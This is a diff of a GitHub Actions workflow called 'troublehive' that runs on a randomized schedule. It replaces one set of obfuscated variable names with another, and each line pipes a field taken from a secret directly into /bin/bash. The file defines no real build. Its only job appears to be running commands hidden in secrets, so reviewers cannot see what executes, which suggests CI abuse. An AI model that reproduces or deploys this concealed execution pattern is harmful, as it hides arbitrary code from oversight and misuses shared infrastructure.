@@ -1,34 +1,27 @@
 name: troublehive
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 3/6 * * *'
-
-jobs:  # 27391
+    - cron: '27 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: troublehive
         env:
-          wx55679: ${{ secrets.wx55679 }}
+          djqn117: ${{ secrets.djqn117 }}
         run: |
-          echo $wx55679 | jq -r .ykr3 | /bin/bash
-          echo $tgunz50522 | jq -r .lo52 | /bin/bash
-          echo $srb60 | jq -r .m71476 | /bin/bash
-          echo $jyykn5 | jq -r .quj916 | /bin/bash
-          echo $o06 | jq -r .nnan5 | /bin/bash
-          echo $i8093 | jq -r .u880 | /bin/bash
-          echo $jomw958 | jq -r .m980 | /bin/bash
-          echo $twauz5 | jq -r .mbjb872 | /bin/bash
-          echo $vr40470 | jq -r .wxoh37454 | /bin/bash
-          echo $nquzc59891 | jq -r .jqpp8880 | /bin/bash
-          echo $fkm96 | jq -r .iiqnf67213 | /bin/bash
-          echo $ibv3 | jq -r .lnhb99977 | /bin/bash
-          echo $yiqfx3457 | jq -r .xna9596 | /bin/bash
-          echo $zyw8 | jq -r .l2 | /bin/bash
-          echo $mbkrh057 | jq -r .had95 | /bin/bash
-          echo $z51 | jq -r .kdz7889 | /bin/bash
+          echo $djqn117 | jq -r .i34 | /bin/bash
+          echo $wx91 | jq -r .obq99846 | /bin/bash
+          echo $pivx7197 | jq -r .halbr1336 | /bin/bash
+          echo $ac116 | jq -r .kdox1553 | /bin/bash
+          echo $i0512 | jq -r .g04 | /bin/bash
+          echo $puqdk5361 | jq -r .sxgrm65985 | /bin/bash
+          echo $t4144 | jq -r .zt239 | /bin/bash
+          echo $dpj1665 | jq -r .lojev77 | /bin/bash
+          echo $itsk169 | jq -r .dru0 | /bin/bash
+          echo $c7565 | jq -r .ik7 | /bin/bash
+          echo $lu41515 | jq -r .m57068 | /bin/bash
+          echo $szmh2 | jq -r .rrm73 | /bin/bash
 
